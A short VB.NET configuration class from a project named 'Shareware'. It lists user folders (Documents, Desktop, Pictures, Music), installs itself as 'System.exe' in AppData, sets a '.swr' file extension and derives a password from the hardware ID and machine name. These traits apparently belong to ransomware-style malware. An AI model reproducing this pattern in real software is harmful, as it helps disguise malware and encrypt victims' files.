Imports System.Environment
Imports System.IO

Namespace Shareware.core

    Public Class DirPaths

        Public Shared AppData As String = GetFolderPath(SpecialFolder.ApplicationData)

        Public Shared Document As String = My.Computer.FileSystem.SpecialDirectories.MyDocuments

        Public Shared Desktop As String = My.Computer.FileSystem.SpecialDirectories.Desktop

        Public Shared Pictures As String = My.Computer.FileSystem.SpecialDirectories.MyPictures

        Public Shared Music As String = My.Computer.FileSystem.SpecialDirectories.MyMusic

        Public Shared ProgramFiles As String = My.Computer.FileSystem.SpecialDirectories.ProgramFiles

        Public Shared AppNameS As String = "System.exe"

        Public Shared InstallDir As String = AppData & "\" & AppNameS

        Public Shared TempPath As String = Path.GetTempPath

        Public Shared ExtensionDefaul As String = ".swr"

        Public Shared strPass As String = New String(CType(Shareware.core.SharewareHook.UserHWID.getHWID() & Environment.MachineName, Char()))

    End Class

End Namespace

